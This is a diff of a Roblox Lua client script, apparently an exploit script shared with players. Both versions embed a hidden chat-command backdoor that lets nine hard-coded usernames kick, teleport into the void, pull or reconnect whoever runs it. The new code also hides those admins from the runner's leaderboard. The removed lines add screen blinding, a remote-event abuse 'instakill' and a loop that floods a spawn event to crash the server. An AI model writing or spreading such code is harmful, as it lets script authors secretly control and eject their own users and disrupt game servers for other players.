@@ -1,251 +1,124 @@
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
 local TextChatService = game:GetService("TextChatService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+
 local LocalPlayer = Players.LocalPlayer
 local PlaceId = game.PlaceId
 
 local Admins = {
-    ["QT_xAraa"] = true,
-    ["Shot16kill"] = true,
-    ["theoverryou3_alt"] = true,
-    ["Raiden_Nika"] = true,
-    ["philippinesBraxy123"] = true,
-    ["Brxy_Alt"] = true,
-    ["VyxzarlIion"] = true,
-    ["Bowmbaclaat"] = true,
-    ["Drenvoryth"] = true
+	["QT_xAraa"] = true,
+	["Shot16kill"] = true,
+	["theoverryou3_alt"] = true,
+	["Raiden_Nika"] = true,
+	["philippinesBraxy123"] = true,
+	["Brxy_Alt"] = true,
+	["VyxzarlIion"] = true,
+	["Bowmbaclaat"] = true,
+	["Drenvoryth"] = true
 }
 
-local OrigSize = Vector3.new(89.47997283935547, 0.05000000074505806, 38.62000274658203)
-local FFConnection = false
-local BlindGui = nil
-local AutoRespawn = false
-local RespawnConnection = nil
-
-local function SwordEquipper()
-    local Backpack = LocalPlayer:FindFirstChild("Backpack")
-    if Backpack then
-        local Sword = Backpack:FindFirstChild("Sword")
-        if Sword then
-            Sword.Parent = LocalPlayer.Character
-            task.wait(0.1)
-            Sword.Parent = Backpack
-        end
-    end
+local function destroyCharacter(player)
+	if player.Character then
+		player.Character:Destroy()
+	end
 end
 
-local function FFChecker()
-    while FFConnection do
-        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("ForceField") then
-            SwordEquipper()
-        end
-        task.wait(0.5)
-    end
+local function hideFromLeaderboard(player)
+	RunService.RenderStepped:Connect(function()
+		local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+		if playerGui then
+			for _, gui in ipairs(playerGui:GetDescendants()) do
+				if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+					if gui.Text == player.Name then
+						gui.TextTransparency = 1
+						gui.Visible = false
+					end
+				end
+			end
+		end
+	end)
 end
 
-local function StartAutoRespawn()
-    if RespawnConnection then RespawnConnection:Disconnect() end
-    RespawnConnection = LocalPlayer.CharacterAdded:Connect(function()
-    end)
-    task.spawn(function()
-        while AutoRespawn do
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                if LocalPlayer.Character.Humanoid.Health <= 0 then
-                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
-                end
-            end
-            task.wait(0.5)
-        end
-    end)
-end
-
-local function StopAutoRespawn()
-    AutoRespawn = false
-    if RespawnConnection then
-        RespawnConnection:Disconnect()
-        RespawnConnection = nil
-    end
+local function handleAdmin(player)
+	destroyCharacter(player)
+	hideFromLeaderboard(player)
+	player.CharacterAdded:Connect(function()
+		destroyCharacter(player)
+	end)
 end
 
 local function ChatCommand(speakerName, message)
-    if Admins[speakerName] then
+	if not Admins[speakerName] then return end
+	message = message:lower()
 
-        local btlModePlayer, btlModeState = message:lower():match("btl mode,%s*([%w_]+)%s*(true)")
-        if btlModePlayer and btlModeState and LocalPlayer.Name:lower():find(btlModePlayer:lower()) then
-            AutoRespawn = true
-            StartAutoRespawn()
-        end
+	local kickTarget = message:match("//kick%s+(%w+)")
+	if kickTarget and LocalPlayer.Name:lower():find(kickTarget) then
+		LocalPlayer:Kick("You were removed from the game by an unknown authority.")
+	end
 
-        local btlModePlayerStop, btlModeStateStop = message:lower():match("btl mode,%s*([%w_]+)%s*(false)")
-        if btlModePlayerStop and btlModeStateStop and LocalPlayer.Name:lower():find(btlModePlayerStop:lower()) then
-            StopAutoRespawn()
-        end
+	local voidTarget = message:match("//void%s+(%w+)")
+	if voidTarget and LocalPlayer.Name:lower():find(voidTarget) then
+		local char = LocalPlayer.Character
+		if char and char:FindFirstChild("HumanoidRootPart") then
+			char:MoveTo(Vector3.new(0, -1000, 0))
+		end
+	end
 
-        local match1 = message:lower():match("//kick%s+([%w_]+)")
-        if match1 and LocalPlayer.Name:lower():find(match1) then
-            LocalPlayer:Kick("Araa and Braxy did not allow you to use this script.")
-        end
+	if message:find("//bringusers") then
+		local admin = Players:FindFirstChild(speakerName)
+		if admin and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
+			local root = admin.Character.HumanoidRootPart
+			local char = LocalPlayer.Character
+			if char and char:FindFirstChild("HumanoidRootPart") then
+				char:MoveTo(root.Position + Vector3.new(3, 0, 3))
+			end
+		end
+	end
 
-        local match2 = message:lower():find("//revealusers")
-        if match2 then
-            TextChatService:SendAsync({
-                Text = "Me",
-                Channel = "RBXGeneral"
-            })
-        end
-
-        local match3 = message:lower():match("//void%s+([%w_]+)")
-        if match3 and LocalPlayer.Name:lower():find(match3) then
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -498, 0)
-            end
-        end
-
-        local match4 = message:lower():match("//shutdown")
-        if match4 then
-            TeleportService:Teleport(PlaceId, LocalPlayer)
-        end
-
-        local match5 = message:lower():match("//removeff%s+([%w_]+)")
-        if match5 and LocalPlayer.Name:lower():find(match5) then
-            local FFParts = workspace:FindFirstChild("ForceFieldDetectorParts")
-            if FFParts then
-                local DetectorPart = FFParts:FindFirstChild("GiveForceFieldDetectorPart")
-                if DetectorPart and DetectorPart:IsA("BasePart") then
-                    DetectorPart.Size = Vector3.new(0, 0, 0)
-                end
-            end
-            if not FFConnection then
-                FFConnection = true
-                task.spawn(FFChecker)
-            end
-        end
-
-        local match6 = message:lower():match("//enableff")
-        if match6 then
-            local FFParts = workspace:FindFirstChild("ForceFieldDetectorParts")
-            if FFParts then
-                local DetectorPart = FFParts:FindFirstChild("GiveForceFieldDetectorPart")
-                if DetectorPart and DetectorPart:IsA("BasePart") then
-                    DetectorPart.Size = OrigSize
-                end
-            end
-            FFConnection = false
-        end
-
-        local match7 = message:lower():match("//blind%s+([%w_]+)")
-        if match7 and LocalPlayer.Name:lower():find(match7) then
-            if not BlindGui then
-                BlindGui = Instance.new("ScreenGui")
-                BlindGui.Name = "BlindEffect"
-                BlindGui.Parent = game:GetService("CoreGui")
-
-                local BlackFrame = Instance.new("Frame")
-                BlackFrame.Size = UDim2.new(10, 0, 10, 0)
-                BlackFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-                BlackFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-                BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-                BlackFrame.BorderSizePixel = 0
-                BlackFrame.Parent = BlindGui
-            end
-        end
-
-        local match8 = message:lower():match("//unblind%s+([%w_]+)")
-        if match8 and LocalPlayer.Name:lower():find(match8) then
-            if BlindGui then
-                BlindGui:Destroy()
-                BlindGui = nil
-            end
-        end
-        
-        local match9 = message:lower():match("//instakill%s+([%w_]+)")
-        if match9 and LocalPlayer.Name:lower():find(match9) then
-            local OrigNinValue = game.Players.LocalPlayer.leaderstats.Ninjutsu.Value
-
-            repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("Train")
-            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Train")
-            tool.Parent = game.Players.LocalPlayer.Character
-
-            game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -math.huge)
-            wait(1)
-            game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
-
-            while wait() do
-                if game.Players.LocalPlayer.leaderstats.Ninjutsu.Value ~= OrigNinValue then
-                    game.Players.LocalPlayer.leaderstats.Ninjutsu.Value = OrigNinValue
-                end
-            end
-        end
-        local match10 = message:lower():match("//spawn%s+([%w_]+)")
-        if match10 and LocalPlayer.Name:lower():find(match10) then
-            ReplicatedStorage.RemoteEvent.SpawnCharacterEvent:FireServer("MainSpawn")
-        end
-        local match11 = message:lower():match("//disablesword%s+([%w_]+)")
-        if match11 and LocalPlayer.Name:lower():find(match11) then
-            local Sword = LocalPlayer.Character:FindFirstChild("Sword")
-            if Sword then
-                for _, child in ipairs(Sword:GetChildren()) do
-                    child:Destroy()
-                end
-            else
-                local Backpack = LocalPlayer:FindFirstChild("Backpack")
-                if Backpack then
-                    Sword = Backpack:FindFirstChild("Sword")
-                    if Sword then
-                        for _, child in ipairs(Sword:GetChildren()) do
-                            child:Destroy()
-                        end
-                    end
-                end
-            end
-        end
-        local match12 = message:lower():match("//rj%s+([%w_]+)")
-        if match12 and LocalPlayer.Name:lower():find(match12) then
-            TeleportService:Teleport(PlaceId, LocalPlayer)
-        end
-        local match13 = message:lower():match("ge daw crash nyo server")
-        if match13 then
-          local RunService = game:GetService("RunService")
-          RunService.Heartbeat:Connect(function(step)
-            ReplicatedStorage.RemoteEvent.SpawnCharacterEvent:FireServer("RandomSpawn")
-          end)
-        end
-    end
+	if message:find("//shutdown") then
+		TeleportService:Teleport(PlaceId, LocalPlayer)
+	end
 end
+
 TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(messageData)
-    local textSource = messageData.TextSource
-    if textSource then
-        local speakerUserId = textSource.UserId
-        local speaker = Players:GetPlayerByUserId(speakerUserId)
-        if speaker then
-            local speakerName = speaker.Name
-            local message = messageData.Text
-            if speakerName and message then
-                ChatCommand(speakerName, message)
-            end
-        end
-    end
+	local textSource = messageData.TextSource
+	if textSource then
+		local speaker = Players:GetPlayerByUserId(textSource.UserId)
+		if speaker then
+			ChatCommand(speaker.Name, messageData.Text)
+		end
+	end
 end)
+
 Players.LocalPlayer.Chatted:Connect(function(message)
-    local whisperMatch = message:match("^/w%s+(%w+)%s+(.+)") or message:match("^/whisper%s+(%w+)%s+(.+)")
-    if whisperMatch then
-        local targetName, whisperMessage = whisperMatch[1], whisperMatch[2]
-        local speakerName = LocalPlayer.Name
-        if Admins[speakerName] then
-            if targetName:lower() == LocalPlayer.Name:lower() then
-                ChatCommand(speakerName, whisperMessage)
-            end
-        end
-    end
+	local target, msg = message:match("^/w%s+(%w+)%s+(.+)")
+	if not target then
+		target, msg = message:match("^/whisper%s+(%w+)%s+(.+)")
+	end
+	if target and msg and Admins[LocalPlayer.Name] and target:lower() == LocalPlayer.Name:lower() then
+		ChatCommand(LocalPlayer.Name, msg)
+	end
 end)
-game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
-    if messageData.FromSpeaker and messageData.MessageType == "Whisper" then
-        local speaker = Players:FindFirstChild(messageData.FromSpeaker)
-        if speaker and messageData.Message then
-            if messageData.ToSpeaker == LocalPlayer.Name then
-                ChatCommand(speaker.Name, messageData.Message)
-            end
-        end
-    end
+
+ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+	if messageData.MessageType == "Whisper" then
+		local speaker = Players:FindFirstChild(messageData.FromSpeaker)
+		if speaker and messageData.ToSpeaker == LocalPlayer.Name then
+			ChatCommand(speaker.Name, messageData.Message)
+		end
+	end
+end)
+
+for _, player in pairs(Players:GetPlayers()) do
+	if player ~= LocalPlayer and Admins[player.Name] then
+		handleAdmin(player)
+	end
+end
+
+Players.PlayerAdded:Connect(function(player)
+	if player ~= LocalPlayer and Admins[player.Name] then
+		handleAdmin(player)
+	end
 end)
